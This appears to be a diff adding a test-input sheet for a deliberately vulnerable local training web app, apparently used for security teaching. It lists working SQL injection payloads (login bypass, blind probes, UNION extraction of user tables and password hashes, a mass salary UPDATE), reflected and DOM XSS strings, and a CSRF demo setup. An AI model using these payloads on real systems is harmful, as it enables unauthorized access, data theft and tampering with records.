@@ -1,0 +1,58 @@
+LOCAL TEST INPUTS — only against this CampusConnect build, never a public website
+
+1) LOGIN BYPASS (easy)
+   Path: vulnerable/login.php
+   Email: ' OR 1=1 -- 
+   Password: anything
+   Note: MySQL requires a space after --. Confirm login as first dummy account, not the attacker who typed email.
+
+2) BOOLEAN BLIND (intermediate)
+   Path: vulnerable/check.php
+   Try: 1 AND 1=1            => Student record exists
+   Try: 1 AND 1=2            => No matching student record
+   Try: 1 AND DATABASE()='campusconnect_lab' => exists
+   Try: 1 AND DATABASE()='incorrect' => not found
+
+3) ADVANCED SQLI (4-column UNION), path vulnerable/directory.php?program=... (input form)
+   Column discovery: ' ORDER BY 4 --  (valid; comments need trailing space)
+                     ' ORDER BY 5 --  (SQL error)
+   UNION visibility: ' UNION SELECT 101,'LOCAL DEMO','TEST PROGRAM','VIA UNION' -- 
+   List tables: ' UNION SELECT 1,table_name,'TABLE',table_schema FROM information_schema.tables WHERE table_schema=database() -- 
+   List columns: ' UNION SELECT 1,column_name,'COLUMN',table_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- 
+   Dummy data: ' UNION SELECT id,full_name,email,password_hash FROM users -- 
+   The original WHERE clause has program LIKE '%...%'; use the quote and comment to terminate it.
+   Local dummy data only; passwords are hashes, not plaintext.
+
+4) PAYROLL UPDATE / AUTHORIZATION + SQLi
+   Path vulnerable/payroll.php, compare rows before/after.
+   Open payroll.php while logged out -> redirected to login; ordinary student -> HTTP 403. In the LOCAL LAB ONLY, use login.php email admin@example.test' --  with any non-empty password to test injected admin login. Then open payroll.php.
+   Injection in employee_code: EMP-001' OR '1'='1
+   salary: 99000
+   Form's SQL becomes UPDATE payroll SET salary=99000 WHERE employee_code='EMP-001' OR '1'='1'
+   All 3 dummy salaries become 99000. Evidence: screenshots + payroll SELECT query.
+   Reset dataset using database/database.sql (recreates tables, all lab data).
+
+5) REFLECTED XSS, vulnerable/search.php
+   Search: <script>alert('Reflected XSS')</script>
+
+6) STORED XSS, vulnerable/profile.php
+   Use attacker-lab/stored-xss-profile-payload.txt and its steps.
+   Do not test while logged in as Sam: friend_add rejects self-friending.
+
+7) DOM XSS, vulnerable/announcement.php
+   URL after # add <img src=x onerror=alert('DOM XSS')>
+
+8) CSRF CROSS-ORIGIN FORM
+   Log in as Bob in CampusConnect, then open attacker-lab/csrf-profile.html served from localhost:8001.
+   Start second server: php -S localhost:8001 -t attacker-lab (from repo root).
+   Click button, check Bob profile afterwards. This is cross-origin (different ports), but same-site;
+   use a consistent localhost host so the demo session cookie is sent.
+
+
+PAYROLL ADMIN GATE (v2)
+1. Logout and navigate directly to /vulnerable/payroll.php -> redirected to login.
+2. Login as alice@example.test / Student123! and visit /vulnerable/payroll.php -> 403.
+3. Logout. In vulnerable login, set Email = admin@example.test' --  (trailing space), Password = anything.
+4. Submit -> login query bypasses password verification for the fictional admin row.
+5. Open Staff Payroll and record fictional salaries. Change one normally as a baseline.
+6. Salary update WHERE clause remains injectable for advanced demonstration after privileged login.
